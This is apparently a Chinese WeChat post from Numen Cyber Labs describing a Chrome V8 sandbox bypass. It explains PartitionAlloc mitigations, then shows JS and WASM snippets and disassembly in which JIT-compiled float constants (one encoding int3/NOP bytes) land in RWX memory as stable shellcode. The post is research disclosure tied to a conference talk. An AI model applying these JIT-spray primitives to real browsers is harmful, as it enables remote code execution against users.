#  Numen独家：利用wasm再次绕过最新Chrome v8sbx

原创 Numen cyber labs  [ Numen Cyber Labs ](javascript:void\(0\);)

**Numen Cyber Labs** ![]()

微信号 gh_06b147bc90bd

功能介绍 专注全球网络安全，传播网安知识，维护网安环境。致力于打造网安头部平台。

____

___发表于_

收录于合集

#chrome 1 个

#Numen 安全学院 38 个

**01  \- 前 言**

2023年11月2日，POC2023在韩国如期举行。NumenCybery两名研究员有幸受邀参加这次会议，一起分享了“Modern Chrome
Exploit Chain Development”的议题。

由于题目冠名“Modern”，如果没有比较新的东西和参会者分享，确实会略显尴尬。于是，在会议议题选中后，我迅速投入V8沙箱绕过研究。起初，我尝试利用fetch过来的binary
data绕过，最后，绕过了PartitionAlloc，实现了完整地址的任意读写，于是我以为绕过了。之后我把PPT做完，迅速和主办方发过去，就安心等会议了。

2023年10月30日早上1点，我突然觉得不能这么大意。半夜突发奇想，起来验证任意读写。大概在上次天府杯的WASM漏洞利用时，使用了PartitionAlloc的方法实现了任意读写，所以这次起初我并没有太多关心是否真的彻底成功了。因为我验证了下读写。然而，当我尝试读写WASM的时候，却崩溃了。我瞬间清醒了，这说明我并没有彻底完成V8沙箱绕过。

之后我调试了下，通过反汇编分析了原因：PartitionAlloc已经不再是原来的那个PartitionAlloc了。确切的说，又添加了4个缓解措施：

  1. 我们不能通过修改FreeList来实现控制MetadataPage了。因为Chrome检查了当前地址和下一个地址的差值，如果不符合要求，那就直接中断（int）

  2. 控制了MetadataPage后，在之前的x86版本，会对FreeList的地址做逻辑运算，如果FreeList不符合要求，直接中断（int3）

  

Partition Alloc free list Mitigation

  *   *   *   *   *   *   *   *   * 

    
    
    558110B6E62B - bswap rdx558110B6E62E - mov rsi,rdx558110B6E631 - xor rsi,r12558110B6E634 - cmp rsi,001FFFFF { 2097151 }558110B6E63B - ja chrome+2C26B80 { ->558110B6EB80 } INT3558110B6E641 - mov esi,edx558110B6E643 - and esi,001FC000 { 2080768 }558110B6E649 - je chrome+2C26B80 { ->558110B6EB80 } INT3  
    

3\. PartitionAlloc对目标地址的写入要求，做了地址范围限制：不能过小。4\. 也不能过大：

Partition Alloc MetadataPage Mitigation(version 118.0.5993.117)

  *   *   *   *   *   * 

    
    
    chrome+2D202FF - mov rax,[chrome+DC12B60] { (162400000000=min(Partition Addr)) }chrome+2D20306 - cmp rax,r14 (r14 is destination addr)chrome+2D20309 - ja chrome+2D20B8B INT3 (if dest < min(PartitionAlloc addr) then crash))chrome+2D2030F - add rax,[chrome+DC12B70] { (0) } (rax+lengthOfParthtion)chrome+2D20316 - cmp rax,r14chrome+2D20319 - jbe chrome+2D20B8B INT3 (if dest > max(PartitionAlloc addr) then crash))

细致研究后我初步得出结论：

我并没有完整绕过PartitonAlloc Alloc，只是获得了一定内存范围内的任意读写。

 **02 - 寻找新的攻击面**

在初步确定没有完全绕过后，我立刻通过邮件与主办方联系，申请稍后更新PPT。随后，无法入睡，我不停地尝试，直到凌晨3点，我认为可能发现了新的绕过方法。稍作休息，5点起床后，我继续晚上的绕过尝试。经过调试，最终确认彻底绕过。

如果我们想绕过V8的沙箱，我们最终需要实现完整地址劫持和稳定的shellcode地址跳转。也就是说，需要稳定的RWX/RX地址计算。上次，我们公开了WASM绕过最新版V8沙箱，使用了Function的原生指针劫持。然而，我们公开后，谷歌迅速将WASM中的函数参数分配放在了可读可写的内存中，导致的结果是我们不能把想要的shellcode放在WASM中。这里，我们首先需要一个指针劫持，这个不太难，我认为是谷歌疏忽了这个点，如下所示

![]()

只要是Chrome研究人员，在编写exploit时，都会从内存中定位这个指针，然后计算WASM的地址，接着像以前一样，将shellcode写入。但是，谷歌没有对这个Native指针进行封装。

仔细研究Manyuemo给出的JIT优化的shellcode后，我发现即便在最新版Chrome中，优化后的浮点数仍旧会被放在RWX的内存中。但是如何稳定计算这个地址是个问题。我没有去研究JIT后的地址计算源码，因为时间紧迫。

  *   *   *   *   *   *   *   * 

    
    
    function fun() {// 1.123=3ff1f7ced916872breturn [1.123, 1.134, 1.345];}for (let i = 0; i < 0x5000; i++) {fun(0);}fun();

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    55D9B81040B8 - mov eax,00000006 { 6 }55D9B81040BD - mov [rdi+03],eax55D9B81040C0 - mov r10,3FF1F7CED916872B { 1.12 }55D9B81040CA - vmovq xmm0,r1055D9B81040CF - vmovsd [rdi+07],xmm055D9B81040D4 - mov r10,3FF224DD2F1A9FBE { 1.13 }55D9B81040DE - vmovq xmm0,r1055D9B81040E3 - vmovsd [rdi+0F],xmm055D9B81040E8 - mov r10,3FF5851EB851EB85 { 0.00 }55D9B81040F2 - vmovq xmm0,r10  
    

这里我想提一句插曲是，其实过去很多时候在完成一个exploit后，有些点我也不清楚为什么会有效。因为老板急需成果，在现有条件和理论基础不够强的情况下，我能做的只能是不断尝试，寻找触发弹出计算器的方法。一般来说，一个exploit完成后，迅速向上级汇报，而其根本原因和底层原理则是日后才去研究的。我觉得过去几年的成果大多是不断尝试的结果。

 **03 - WASM的JIT**

结合Manyuemo的JIT函数，我认为如果V8沙箱的绕过存在，很可能在其他一些边缘的地方。比如WASM、WebAudio、WebSQL等等，我们可以看到过去编写exploit容易的地方，谷歌一直在努力加强安全性。因此，我尝试了下WASM函数的JIT。果然，我发现WASM函数优化后也会将参数放到RWX的内存中。

wat代码

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    (module  (func (export "main") (result f64)    ;; -6.654614018578406e+60=CC90909090909090    f64.const -6.654614018578406e+60    ;; 1.124=3ff1fbe76c8b4396    f64.const 1.124    ;; 1.125=3ff2000000000000    f64.const 1.125    ;; 1.126=3ff204189374bc6a    f64.const 1.126    drop    drop    drop))  
    

  *   *   *   *   *   *   *   *   * 

    
    
    var wasmCode = new Uint8Array([...wasm..binary…]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var f = wasmInstance.exports.main;for (let i = 0; i < 0x10000; i++) {f();}%DebugPrint(wasmInstance);  
    

javascript测试代码

生成的代码如下：

  *   *   *   *   *   *   *   *   *   * 

    
    
    355CEAE43715 - jbe 355CEAE43771355CEAE4371B - mov r10,CC90909090909090 { -1869574000 }355CEAE43725 - vmovq xmm0,r10355CEAE4372A - mov r10,3FF1FBE76C8B4396 { 1.12 }355CEAE43734 - vmovq xmm1,r10355CEAE43739 - mov r10,3FF2000000000000 { 1.13 }355CEAE43743 - vmovq xmm2,r10355CEAE43748 - mov r10,3FF204189374BC6A { 1.13 }355CEAE43752 - vmovq xmm3,r10  
    

 **04 - 演示**

 **05 - 总结**

在兼顾JIT性能的同时，类似于之前的WASM绕过，我们不得不考虑将浮点数等比较长的可预测常量属性设置为R/RW，或者同时修复它们的可预测地址方法。否则，攻击者很容易获得稳定的shellcode执行。

 **06 - 参考**

https://blog.noah.360.net/chromium_v8_remote_code_execution_vulnerability_analysis/  
https://medium.com/@numencyberlabs/use-native-pointer-of-function-to-bypass-
the-latest-chrome-v8-sandbox-exp-of-issue1378239-251d9c5b0d14  
https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-
rce-183dcb6f3078  
https://medium.com/numen-cyber-labs/analysis-and-summary-of-tcp-ip-protocol-
remote-code-execution-vulnerability-cve-2022-34718-8fcc28538acf  
https://bugs.chromium.org/p/chromium/issues/detail?id=1452137

  

  
  
  
 **关于 Numen  Cyber** ****

Numen Cyber 是链上威胁检测与防御的先驱，团队成员拥有在亚马逊、华为、百度、奇虎360等众多知名大厂与 OKlink，知道创宇，成都链安等知名
Web3 主体安全岗位从业经历。

拥有 Web2+Web3 多重安全技能储备的 Numen Cyber 旗下拥有 ImmunX 和 Leukocyte 两款安全产品，分别可在应用层和物理层为
Web3 项目提供保护。其中 ImmunX 包含安全策略开放市场和合约防火墙等独创功能，可以为 Web3 生态提供一站式全方位的保护；Leukocyte
则是保护服务器安全，实时检测黑客针对服务器的各种攻击并自动阻断、报警。

目前 Numen Cyber 的合作伙伴包括不限于 Binance，Cobo，Suiet
等，也包括中国移动、中国电信、中国联通，以及阿里云、腾讯、华为、亚马逊、微软等。

  

  
  
Numen 官网https://numencyber.com/
GitHubhttps://github.com/NumenCyberTwitterhttps://twitter.com/@numencyberMediumhttps://medium.com/@numencyberlabsLinkedInhttps://www.linkedin.com/company/numencyber/

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

